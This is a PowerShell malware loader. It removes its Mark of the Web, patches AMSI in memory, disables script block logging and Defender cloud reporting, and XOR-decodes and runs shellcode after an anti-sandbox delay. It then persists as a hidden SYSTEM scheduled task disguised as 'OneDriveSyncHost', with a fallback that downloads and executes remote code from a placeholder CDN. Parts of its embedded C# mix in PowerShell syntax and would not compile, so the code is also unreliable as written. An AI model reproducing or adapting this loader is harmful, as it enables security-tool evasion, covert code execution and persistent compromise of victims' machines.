$ErrorActionPreference = 'SilentlyContinue'

# EMBEDDED BASE64 FALLBACK (for pure IEX cases)
$embeddedScript = "JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0K...FULL_BASE64_OF_THIS_SCRIPT_IF_YOU_WANT..."

# 1. Self MOTW kill
$me = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
if ($me) {
    Unblock-File -Path $me -EA SilentlyContinue
    Remove-Item -Path $me -Stream Zone.Identifier -EA SilentlyContinue
}

# 2. AMSI + SBL bypass
$amsiCode = @'
using System;
using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        if (lib -eq [IntPtr]::Zero) return;
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        if (addr -eq [IntPtr]::Zero) return;
        uint old;
        VirtualProtect(addr, (UIntPtr)6, 0x40, [ref]$old);
        Marshal.Copy([byte[]](0x31,0xC0,0xC3), 0, addr, 3);
        VirtualProtect(addr, (UIntPtr)6, old, [ref]$old);
    }
}
'@
Add-Type $amsiCode
[Amsi]::Patch()

$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
if ($settings) {
    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
}

# 3. MAPS triple kill (this murders the popup)
try {
    $hkcu = "HKCU:\Software\Microsoft\Windows Defender\Spynet"
    New-Item -Path $hkcu -Force | Out-Null
    Set-ItemProperty -Path $hkcu -Name "SubmitSamplesConsent" -Value 0 -Type DWord -Force
    Set-ItemProperty -Path $hkcu -Name "SpyNetReporting" -Value 0 -Type DWord -Force
    Set-ItemProperty -Path $hkcu -Name "FirstRun" -Value 0 -Type DWord -Force
} catch {}

try {
    Set-MpPreference -SubmitSamplesConsent NeverSend -MAPSReporting Disabled -EA SilentlyContinue
} catch {}

if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        $hklm = "HKLM:\Software\Microsoft\Windows Defender\Spynet"
        New-Item -Path $hklm -Force | Out-Null
        Set-ItemProperty -Path $hklm -Name "SubmitSamplesConsent" -Value 0 -Type DWord -Force
        Set-ItemProperty -Path $hklm -Name "SpyNetReporting" -Value 0 -Type DWord -Force
        Remove-ItemProperty -Path $hklm -Name "LastSuccessfulSubmitTime" -EA SilentlyContinue
    } catch {}
}

$enc = ""

$encBytes = [Convert]::FromBase64String($enc)

$key = 0x5A
$payloadBytes = [byte[]]::new($encBytes.Length)
for ($i = 0; $i -lt $encBytes.Length; $i++) {
    $payloadBytes[$i] = $encBytes[$i] -bxor $key
}

# $payloadBytes = $encBytes

# 5. Non-blocking shellcode runner
$runnerCode = @'
using System;
using System.Runtime.InteropServices;
public class Runner {
    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    public static void Execute(byte[] sc) {
        IntPtr region = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, region, sc.Length);
        CreateThread(IntPtr.Zero, 0, region, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
'@
Add-Type $runnerCode

# 6. Anti-sandbox delay + execute
Start-Sleep -Seconds (Get-Random -Minimum 45 -Maximum 120)
[Runner]::Execute($payloadBytes)

# 7. Persistence
$flag = "$env:TEMP\persist_$([Environment]::MachineName.GetHashCode()).dat"
if (-not (Test-Path $flag)) {
    $persistFile = "$env:TEMP\OneDriveSyncHost.txt"
    if ($me) {
        Copy-Item -Path $me -Destination $persistFile -Force
    } else {
        $scriptBlob = $MyInvocation.MyCommand.ScriptBlock.ToString()
        if (-not $scriptBlob -and $embeddedScript) {
            $scriptBlob = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($embeddedScript))
        }
        if (-not $scriptBlob) { $scriptBlob = "iex (iwr 'https://your-cdn/update.txt' -UseBasicParsing).Content" }
        [System.IO.File]::WriteAllText($persistFile, $scriptBlob)
    }
    Unblock-File -Path $persistFile -EA SilentlyContinue
    Remove-Item -Path $persistFile -Stream Zone.Identifier -EA SilentlyContinue

    $taskName = "OneDriveSyncHost"
    $cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistFile`""
    schtasks /create /tn $taskName /tr $cmd /sc onlogon /ru SYSTEM /f /rl highest -EA SilentlyContinue | Out-Null
    if (-not (schtasks /query /tn $taskName -EA SilentlyContinue)) {
        schtasks /create /tn $taskName /tr $cmd /sc onlogon /f -EA SilentlyContinue | Out-Null
    }
    New-Item -Path $flag -Force | Out-Null
}

exit 0
